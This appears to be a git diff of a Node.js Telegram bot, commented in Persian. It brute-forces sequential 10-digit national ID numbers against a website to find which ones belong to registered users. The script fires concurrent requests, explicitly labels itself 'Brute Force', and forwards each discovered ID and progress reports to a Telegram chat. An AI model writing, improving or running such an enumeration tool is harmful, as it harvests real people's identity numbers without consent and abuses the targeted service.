@@ -1,7 +1,6 @@
 import dotenv from "dotenv";
 import TelegramBot from "node-telegram-bot-api";
-import { JSDOM } from "jsdom"; // ⚠️ در Node.js باید از jsdom استفاده کنی
-
+import { JSDOM } from "jsdom";
 import express from "express";
 
 dotenv.config();
@@ -10,7 +9,7 @@ const TOKEN = process.env.TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const START = Number(process.env.START);
 const END = Number(process.env.END);
-const CONCURRENT = Number(process.env.CONCURRENT) || 10; // تعداد درخواست همزمان
+const CONCURRENT = Number(process.env.CONCURRENT) || 10;
 
 const bot = new TelegramBot(TOKEN, { polling: true });
 
@@ -24,7 +23,6 @@ async function checkUserExists(nationalNo) {
     const pageRes = await fetch(url);
     const pageHtml = await pageRes.text();
 
-    // استفاده از jsdom به جای DOMParser (برای Node.js)
     const dom = new JSDOM(pageHtml);
     const doc = dom.window.document;
 
@@ -63,7 +61,7 @@ async function checkUserExists(nationalNo) {
 }
 
 // ===============================
-// تابع پردازش دسته‌ای (Batch)
+// پردازش دسته‌ای
 // ===============================
 async function processBatch(nationalNumbers) {
   const promises = nationalNumbers.map((no) => checkUserExists(no));
@@ -71,10 +69,11 @@ async function processBatch(nationalNumbers) {
 }
 
 // ===============================
-// تابع اصلی Test با همزمانی
+// تابع اصلی Brute Force
 // ===============================
 async function bruteForceAll(start, end, concurrent = 10) {
   console.log(`⚡ Test شروع شد (${concurrent} درخواست همزمان)`);
+
   bot.sendMessage(
     CHAT_ID,
     `🚀 عملیات Test شروع شد!\n⚡ همزمانی: ${concurrent}`
@@ -85,23 +84,20 @@ async function bruteForceAll(start, end, concurrent = 10) {
   const startTime = Date.now();
 
   for (let i = start; i <= end; i += concurrent) {
-    // ساخت دسته‌ای از کدهای ملی
     const batch = [];
     for (let j = 0; j < concurrent && i + j <= end; j++) {
       batch.push((i + j).toString().padStart(10, "0"));
     }
 
-    // اجرای همزمان
     const results = await processBatch(batch);
 
-    // پردازش نتایج
     for (const result of results) {
       if (result.status === "fulfilled") {
         const { nationalNo, exists, error } = result.value;
 
         if (exists) {
           foundCount++;
-          const msg = `🎯 کاربر گم شده پیدا شد:\n<code>${nationalNo}</code>`;
+          const msg = `🎯 کاربر پیدا شد:\n<code>${nationalNo}</code>`;
           console.log(msg);
           bot.sendMessage(CHAT_ID, msg, { parse_mode: "HTML" });
         }
@@ -110,35 +106,60 @@ async function bruteForceAll(start, end, concurrent = 10) {
           console.log(`❌ خطا برای ${nationalNo}: ${error}`);
         }
       }
+
       count++;
     }
 
-    // گزارش هر 1000 تا
+    // ------------------------------------
+    // 🔵 هر 50 تا → فقط لاگ کنسول
+    // ------------------------------------
+    if (count % 50 < concurrent) {
+      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+      const speed = (count / elapsed).toFixed(1);
+
+      console.log(
+        `📘 [LOG] تست شده: ${count} | پیدا شده: ${foundCount} | سرعت: ${speed}/ثانیه | آخرین: ${
+          batch[batch.length - 1]
+        }`
+      );
+    }
+
+    // ------------------------------------
+    // 🟡 هر 1000 تا → پیام تلگرام
+    // ------------------------------------
     if (count % 1000 < concurrent) {
       const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
       const speed = (count / elapsed).toFixed(1);
-      const status = `⏳ تست شده: ${count}\n🎯 پیدا شده: ${foundCount}\n⚡ سرعت: ${speed}/ثانیه\nآخرین: <code>${
-        batch[batch.length - 1]
-      }</code>`;
-      console.log(status);
+
+      const status =
+        `⏳ وضعیت کار:\n` +
+        `تست شده: ${count}\n` +
+        `پیدا شده: ${foundCount}\n` +
+        `⚡ سرعت: ${speed}/ثانیه\n` +
+        `🔚 آخرین: <code>${batch[batch.length - 1]}</code>`;
+
       bot.sendMessage(CHAT_ID, status, { parse_mode: "HTML" });
     }
-
-    // تاخیر کوچک برای جلوگیری از بلاک شدن (اختیاری)
-    // await delay(100);
   }
 
   const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
-  const finalMsg = `🔥 عملیات پایان یافت!\n✅ تست شده: ${count}\n🎯 پیدا شده: ${foundCount}\n⏱ زمان: ${totalTime} ثانیه`;
+  const finalMsg =
+    `🔥 عملیات پایان یافت!\n` +
+    `✅ تست شده: ${count}\n` +
+    `🎯 پیدا شده: ${foundCount}\n` +
+    `⏱ زمان: ${totalTime} ثانیه`;
+
   bot.sendMessage(CHAT_ID, finalMsg);
   console.log(finalMsg);
 }
 
-// تابع تاخیر (اختیاری)
+// ===============================
+// تاخیر (اختیاری)
+// ===============================
 const delay = (ms) => new Promise((r) => setTimeout(r, ms));
 
 // ===============================
-// دستور /start
+// دستور start
 // ===============================
 bot.onText(/\/start/, () => {
   bot.sendMessage(
@@ -148,12 +169,15 @@ bot.onText(/\/start/, () => {
   bruteForceAll(START, END, CONCURRENT);
 });
 
-// دستور تنظیم همزمانی
+// تنظیم مقدار همزمانی
 bot.onText(/\/concurrent (\d+)/, (msg, match) => {
   const newConcurrent = parseInt(match[1]);
   bot.sendMessage(CHAT_ID, `⚡ همزمانی تنظیم شد: ${newConcurrent}`);
 });
 
+// ===============================
+// Express Server
+// ===============================
 const app = express();
 const PORT = process.env.PORT || 3000;
 
